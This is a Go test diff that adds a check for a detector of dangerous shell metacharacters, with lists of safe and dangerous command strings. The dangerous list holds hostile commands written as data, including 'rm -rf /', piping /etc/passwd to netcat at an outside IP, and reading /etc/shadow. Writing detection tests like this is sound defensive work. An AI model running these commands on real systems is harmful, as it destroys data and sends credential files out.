@@ -301,3 +301,34 @@ func ExampleSplitCommandAndArgs() {
 	// Windows: mkdir /P "C:\Program Files": mkdir [/P,C:\Program Files]
 	// Linux: mkdir -p /path/with\ space: mkdir [-p,/path/with space]
 }
+
+func TestHasDangerousShellMetachars(t *testing.T) {
+	dangerous := []string{
+		"echo hello; rm -rf /",
+		"echo hello && whoami",
+		"cat /etc/passwd | nc 1.2.3.4 5678",
+		"echo `whoami`",
+		"echo $(id)",
+		"echo foo > /tmp/bar",
+		"cat < /etc/shadow",
+		"echo foo\nrm -rf /",
+		"echo foo || ls",
+	}
+	for _, cmd := range dangerous {
+		if !HasDangerousShellMetachars(cmd) {
+			t.Errorf("expected %q to be detected as dangerous shell metachars", cmd)
+		}
+	}
+
+	safe := []string{
+		"ls -la",
+		"git status",
+		"echo hello world",
+		"ffmpeg -i input.mp4 output.webm",
+	}
+	for _, cmd := range safe {
+		if HasDangerousShellMetachars(cmd) {
+			t.Errorf("expected %q to NOT be detected as dangerous", cmd)
+		}
+	}
+}
